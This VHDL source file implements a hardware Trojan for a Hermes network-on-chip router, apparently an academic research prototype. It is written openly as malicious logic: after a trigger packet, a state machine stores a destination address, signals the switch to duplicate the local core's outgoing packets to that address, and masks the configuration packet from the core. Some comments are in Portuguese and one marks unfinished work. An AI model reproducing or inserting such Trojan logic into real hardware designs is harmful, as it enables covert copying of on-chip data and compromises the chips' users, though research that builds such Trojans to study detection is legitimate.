--------------------------------------------------------------------------------------
-- DESIGN UNIT  : Hardware Trojan                                                   --
-- DESCRIPTION  :                                                                   --
-- AUTHOR       : Geaninne Marchezan Lopes and Iaçanã I. Weber                      --
-- CREATED      : Apr 2019                                                          --
-- VERSION      : v0.1                                                              --
--------------------------------------------------------------------------------------

library ieee;
use ieee.std_logic_1164.all;
use work.HermesPackage.all;

entity HardwareTrojan is 
    port(
        clock : 		in std_logic;
        reset :	 		in std_logic;
        
        data_in :	 	in regflit; 	-- to read the information on the local port
        destAddr :      in regmetadeflit;
        dupFlit :       out regflit;
        sending:        in std_logic;

        --Switch Control Interface
        duplicate : 	out std_logic; 	-- to inform the SW that the packet must be duplicated
    	free : 			in regNport;
		mux_in :	 	in arrayNport_reg3;
		mux_out : 		in arrayNport_reg3;

        --Buffers Interface
        configPkg : 	in regNport; -- informs the presence of a config packet inside the buffer

        --Crossbar Interface
        creditIn : 		in regNport;
        data_out : 		out regflit; 	-- to output the malicious addr
        dataSel	:		out std_logic; 	-- to select which flit will go through the crossbar

        --Local Buffer Interface
        maskPkg_o :     out std_logic;
        h :             in std_logic;
        h_ack :         in std_logic
        );
end HardwareTrojan;

architecture HardwareTrojan of HardwareTrojan is

type HTState is (S0, waiting, readDestination, waitHeader, transmitting);
signal state : HTState;
signal destination : regmetadeflit;

signal maskPkg : std_logic;

begin

    process(clock, reset)
    begin
        if reset = '1' then
            state <= S0;
            destination <= (others=>'0');
        elsif rising_edge(clock) then
            case state is
                -- Reset state
                when S0 =>
                    state <= waiting;

                -- Waiting the awakening packet
                when waiting =>
                    if maskPkg = '0' then
                        state <= readDestination;
                    else
                        state <= waiting;
                    end if;

                -- Stores the Destination address to replace it in the duplicated packet
                when readDestination =>
                    destination <= destAddr;
                    state <= waitHeader;

                -- Waits until the LOCAL IP send a new packet
                when waitHeader =>
                    if sending = '1' then -- ADICIONAR O CREDITO AQUI! PARA GARANTIR A LEITURA
                        state <= transmitting;
                    else
                        state <= waitHeader;
                    end if;

                when transmitting =>
                    if sending = '1' then
                        state <= transmitting;
                    else
                        state <= waitHeader;
                    end if;

                when OTHERS =>
                    state <= S0;
            end case;
        end if;
    end process;

    -- Duplicated packet header
    dupFlit <= x"01" & destination when state = waitHeader else data_in;

    -- Informa o Switch Control que ele deve rotear os próximos pacotes locais para duas saídas
    duplicate <= '1' when state = waitHeader else '0';

    data_out <= (others=> '0');
    dataSel <= '0';

    -- Mascara o pacote de configuração para o IP!
    maskPkg <= '0' when configPkg(0) = '1' or configPkg(1) = '1' or configPkg(2) = '1' or configPkg(3) = '1' or configPkg(4) = '1' else '1';
    maskPkg_o <= maskPkg;

end HardwareTrojan;